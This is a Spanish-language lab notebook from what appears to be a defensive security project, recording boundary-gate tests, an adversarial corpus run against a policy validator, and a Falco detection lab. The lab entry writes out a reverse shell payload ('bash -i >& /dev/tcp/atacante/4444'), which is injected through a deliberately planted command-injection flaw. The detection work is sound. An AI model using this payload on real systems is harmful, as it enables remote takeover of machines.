# Evidencia — la libreta

Cada medicion real: que se probo, que salio, que cambio por ello.

**Los resultados negativos se escriben con el mismo detalle que los positivos, o mas.**
Un proyecto que solo registra lo que funciono no tiene evidencia: tiene publicidad. Y el
dato que no esta en el repo, no existe — la memoria de nadie cuenta.

## Formato

`## AAAA-MM-DD · que se probo — VEREDICTO`, y debajo: montaje, resultado, consecuencia.

## Qué se va a medir (declarado antes de medir, ARQUITECTURA.md §8)

1. Tasa de rechazo del evaluador (si es cero, el gate no gatea).
2. Falsos positivos de reglas generadas por IA contra el corpus benigno.
3. Tiempo de contención (T0/T1) medido APARTE del tiempo de análisis (T2).
4. Tasa y tiempo medio de rollback — probado, no documentado.
5. Resistencia a inyección de prompt vía telemetría (objetivo: 0 políticas aplicadas).
6. Disponibilidad con la IA apagada (debe ser idéntica).

---

## 2026-07-31 · El gate de fronteras, ¿gatea de verdad? — PASA, con una trampa

**Montaje.** Escrito `.gb-boundaries` con 17 reglas y ejecutado `gb graph src --gate`
sobre el paquete limpio; después inyectada a propósito una violación real
(`guardia.actores` importando `guardia.politica`, que es justo lo que la regla 3
prohíbe) y repetido.

**Resultado.** Limpio: salida 0. Con la violación: salida 1 y el cruce señalado por
nombre. El gate gatea.

**La trampa, que es lo que hace útil esta entrada.** En el primer intento el gate pasó
en verde **con la violación puesta**. Causa: `.gb-boundaries` estaba en la raíz del
proyecto y `gb graph src` lo busca dentro del path que analiza. Cargaba cero reglas y
no lo decía en la salida corta. Un fichero de invariantes en el sitio equivocado no
falla ruidosamente: pasa en verde, que es el peor modo de fallo posible para un gate.

**Consecuencia.** El fichero se movió a `src/.gb-boundaries`. Y la lección general, que
vale para todos los gates de este proyecto: **un gate se verifica rompiéndolo a
propósito**, nunca comprobando que pasa. Es el mismo argumento del punto 3 del criterio
de terminado aplicado a nuestras propias herramientas.

## 2026-07-31 · Corpus adversarial contra el validador determinista — PASA

**Montaje.** 13 propuestas JSON en [corpus/propuestas/](../corpus/propuestas/), con el
veredicto esperado declarado en el nombre del fichero: 3 legítimas, 4 que violan
invariantes (lockout de SSH, lockout total entrante, cegado del log de auditoría,
denegación de rutas del plano de control), 1 que ciega el registro por syscalls, y 4
malformadas para la gramática (tipo inventado, motor inventado, puerto 70000, CIDR
alucinado).

**Resultado.** 84 tests en verde. Las 10 envenenadas se rechazan y **por el motivo
esperado**, no por casualidad: el test compara el invariante violado contra el prefijo
del nombre. Códigos de salida de la CLI: 0 legítima, 5 violación de invariante, 2
descartada por gramática.

**Consecuencia.** La tasa de rechazo es distinta de cero contra un adversario escrito a
mano. Esto **no** mide todavía lo que dice la métrica 5 (resistencia a inyección de
prompt), porque aquí no hay LLM: mide que el validador determinista que hay debajo del
LLM rechaza lo que debe. Cuando entre T2, este mismo corpus se envuelve en telemetría
hostil y se vuelve a medir.

**Negativo honesto.** El corpus lo escribí yo sabiendo qué comprueba el validador. Un
corpus escrito por quien conoce las respuestas mide menos de lo que parece; el corpus
que cuenta es el que sale de incidentes reales y el que escriba un modelo distinto
intentando colar cosas.

## 2026-07-31 · Laboratorio T0/T1: ¿Falco detecta el escenario SIN IA? — SÍ (una vez), con reservas de entorno

**Montaje.** [lab/](../lab/): tres contenedores en red aislada — servidor web
vulnerable a propósito (inyección de comandos en `/ping`), atacante (curl + netcat),
y Falco 0.39.2→0.41.3 con ruleset base + una regla local. El ataque: shell inversa
`bash -i >& /dev/tcp/atacante/4444` inyectada vía la vuln.

**Resultado — lo que SÍ quedó demostrado.**
1. **El ataque es reproducible.** La shell inversa se establece de forma fiable en
   cada disparo (`root@lab-objetivo:/app#` capturado como botín). El incidente que el
   pipeline necesita repetir a voluntad, existe.
2. **Falco detecta el escenario con su RULESET BASE, sin IA.** Regla base *"Redirect
   stdout/stdin to network connection"*, prioridad Notice, con la línea completa:
   `command=bash -c bash -i >& /dev/tcp/atacante/4444 0>&1 ... container=lab-objetivo`.
   Esta es la tesis central del MVP en la práctica: la contención vive en T0/T1
   (regla 1). Si solo lo detectara un LLM, sería teatro — y no lo es.

**Hallazgo de diseño: `proc.pname` vs `proc.aname`.** Mi regla local escrita a mano NO
disparó, y el output de Falco explicó por qué: la cadena real es
`python → sh → bash -c → bash -i`, así que el padre *directo* del shell es `bash`, no
`python`. La regla miraba `proc.pname` (padre directo) cuando debía mirar la cadena de
ancestros `proc.aname[1..4]`. Corregida en
[lab/falco/reglas_locales.yaml](../lab/falco/reglas_locales.yaml). **Esto es exactamente
lo que el gate de replay malicioso (regla 6) atrapa: una regla que no dispara contra el
repro → REJECT.** Una regla plausible sobre el papel que no cubre el incidente real.

**Negativo de entorno: la captura de Falco en WSL2 es inestable.** Reservas serias:
- Falco 0.39.2 **no arranca** con el kernel 6.18 de WSL2 (`scap_init` falla en
  `modern_ebpf`); 0.41.3 sí. El driver tiene que ir por delante del kernel.
- Aun con 0.41.3, la captura funcionó **una sola vez**: el primer arranque fresco tras
  descargar la imagen. Tras `restart`/`recreate`/`down+up` posteriores, Falco arranca
  y valida las reglas pero **deja de emitir eventos** (0 alertas, incluida la base que
  antes sí saltó). No es determinista y no lo he sabido estabilizar.

**Consecuencia.** La corrección `aname` queda **escrita y razonada pero NO verificada en
ejecución** — no la he podido observar disparando porque la captura se cayó antes. No se
marca como validada. Y la conclusión operativa, que ya anticipaba
[lab/README.md](../lab/README.md): **para trabajo sostenido el laboratorio se mueve a una
VM Linux con kernel estable**; Docker Desktop sobre WSL2 sirvió para probar el escenario
una vez, no como banco de pruebas fiable. Se registra como negativo, no se maquilla.
